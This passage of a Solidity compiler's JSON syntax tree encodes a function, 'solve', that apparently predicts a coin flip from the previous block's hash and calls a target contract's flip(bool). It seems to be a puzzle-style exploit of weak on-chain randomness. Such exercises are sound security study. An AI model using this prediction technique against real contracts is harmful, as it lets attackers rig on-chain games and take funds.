																							"src": "1116:5:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_magic_block",
																								"typeString": "block"
																							}
																						},
																						"id": 100,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"memberName": "number",
																						"nodeType": "MemberAccess",
																						"src": "1116:12:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"nodeType": "BinaryOperation",
																					"operator": "-",
																					"rightExpression": {
																						"hexValue": "31",
																						"id": 101,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "1131:1:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_1_by_1",
																							"typeString": "int_const 1"
																						},
																						"value": "1"
																					},
																					"src": "1116:16:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				],
																				"id": 98,
																				"name": "blockhash",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 4294967291,
																				"src": "1106:9:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_function_blockhash_view$_t_uint256_$returns$_t_bytes32_$",
																					"typeString": "function (uint256) view returns (bytes32)"
																				}
																			},
																			"id": 103,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "functionCall",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "1106:27:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_bytes32",
																				"typeString": "bytes32"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_bytes32",
																				"typeString": "bytes32"
																			}
																		],
																		"id": 97,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "1098:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint256_$",
																			"typeString": "type(uint256)"
																		},
																		"typeName": {
																			"id": 96,
																			"name": "uint256",
																			"nodeType": "ElementaryTypeName",
																			"src": "1098:7:0",
																			"typeDescriptions": {}
																		}
																	},
																	"id": 104,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "1098:36:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "/",
																"rightExpression": {
																	"id": 105,
																	"name": "FACTOR",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 84,
																	"src": "1137:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "1098:45:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"id": 107,
														"isConstant": false,
														"isInlineArray": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "TupleExpression",
														"src": "1097:47:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"hexValue": "31",
														"id": 108,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "1148:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_rational_1_by_1",
															"typeString": "int_const 1"
														},
														"value": "1"
													},
													"src": "1097:52:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1079:70:0"
											},
											{
												"condition": {
													"commonType": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"id": 113,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 111,
														"name": "previous",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 89,
														"src": "1163:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"id": 112,
														"name": "whatToSend",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 95,
														"src": "1175:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"src": "1163:22:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 119,
												"nodeType": "IfStatement",
												"src": "1160:73:0",
												"trueBody": {
													"id": 118,
													"nodeType": "Block",
													"src": "1187:46:0",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"hexValue": "74727920616761696e",
																		"id": 115,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "string",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "1209:11:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_stringliteral_3bfaf844afc88d0f2cd5aada38319ff0c45bf19595754524aaf617ffcfd4e2e4",
																			"typeString": "literal_string \"try again\""
																		},
																		"value": "try again"
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_stringliteral_3bfaf844afc88d0f2cd5aada38319ff0c45bf19595754524aaf617ffcfd4e2e4",
																			"typeString": "literal_string \"try again\""
																		}
																	],
																	"id": 114,
																	"name": "revert",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [
																		4294967277,
																		4294967277
																	],
																	"referencedDeclaration": 4294967277,
																	"src": "1202:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_revert_pure$_t_string_memory_ptr_$returns$__$",
																		"typeString": "function (string memory) pure"
																	}
																},
																"id": 116,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1202:19:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 117,
															"nodeType": "ExpressionStatement",
															"src": "1202:19:0"
														}
													]
												}
											},
											{
												"expression": {
													"arguments": [
														{
															"arguments": [
																{
																	"arguments": [
																		{
																			"arguments": [
																				{
																					"hexValue": "666c697028626f6f6c29",
																					"id": 128,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "string",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "1297:12:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_stringliteral_1d263f678198afcb61494c86d0b849d04a869f89e604450ae1a549aa6619dd3d",
																						"typeString": "literal_string \"flip(bool)\""
																					},
																					"value": "flip(bool)"
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_stringliteral_1d263f678198afcb61494c86d0b849d04a869f89e604450ae1a549aa6619dd3d",
																						"typeString": "literal_string \"flip(bool)\""
																					}
																				],
																				"id": 127,
																				"name": "keccak256",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 4294967288,
																				"src": "1287:9:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_function_keccak256_pure$_t_bytes_memory_ptr_$returns$_t_bytes32_$",
																					"typeString": "function (bytes memory) pure returns (bytes32)"
																				}
																			},
																			"id": 129,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "functionCall",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "1287:23:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_bytes32",
																				"typeString": "bytes32"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_bytes32",
																				"typeString": "bytes32"
																			}
																		],
																		"id": 126,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "1280:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_bytes4_$",
																			"typeString": "type(bytes4)"
																		},
																		"typeName": {
																			"id": 125,
																			"name": "bytes4",
																			"nodeType": "ElementaryTypeName",
																			"src": "1280:6:0",
																			"typeDescriptions": {}
																		}
																	},
																	"id": 130,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "1280:31:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes4",
																		"typeString": "bytes4"
																	}
																},
																{
																	"id": 131,
																	"name": "whatToSend",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 95,
																	"src": "1312:10:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_bytes4",
																		"typeString": "bytes4"
																	},
																	{
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																],
																"expression": {
																	"id": 123,
																	"name": "abi",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 4294967295,
																	"src": "1269:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_abi",
																		"typeString": "abi"
																	}
																},
																"id": 124,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"memberName": "encode",
																"nodeType": "MemberAccess",
																"src": "1269:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_abiencode_pure$__$returns$_t_bytes_memory_ptr_$",
																	"typeString": "function () pure returns (bytes memory)"
																}
															},
															"id": 132,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1269:54:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"expression": {
															"id": 120,
															"name": "contractAddr",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 87,
															"src": "1243:12:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"id": 122,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "delegatecall",
														"nodeType": "MemberAccess",
														"src": "1243:25:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_baredelegatecall_nonpayable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
															"typeString": "function (bytes memory) returns (bool,bytes memory)"
														}
													},
													"id": 133,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1243:81:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
														"typeString": "tuple(bool,bytes memory)"
													}
												},
												"id": 134,
												"nodeType": "ExpressionStatement",
												"src": "1243:81:0"
											},
											{
												"expression": {
													"id": 137,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 135,
														"name": "previous",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 89,
														"src": "1335:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"id": 136,
														"name": "whatToSend",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 95,
														"src": "1346:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"src": "1335:21:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 138,
												"nodeType": "ExpressionStatement",
												"src": "1335:21:0"
											}
										]
									},
									"functionSelector": "890d6908",
									"id": 140,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "solve",
									"nameLocation": "1035:5:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 90,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1040:2:0"
									},
									"returnParameters": {
										"id": 93,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 92,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 140,
												"src": "1059:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 91,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1059:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1058:9:0"
									},
									"scope": 141,
									"src": "1026:338:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 142,
							"src": "810:557:0",
							"usedErrors": []
						}
					],
					"src": "33:1334:0"
				},
				"id": 0
			}
		}
	}
}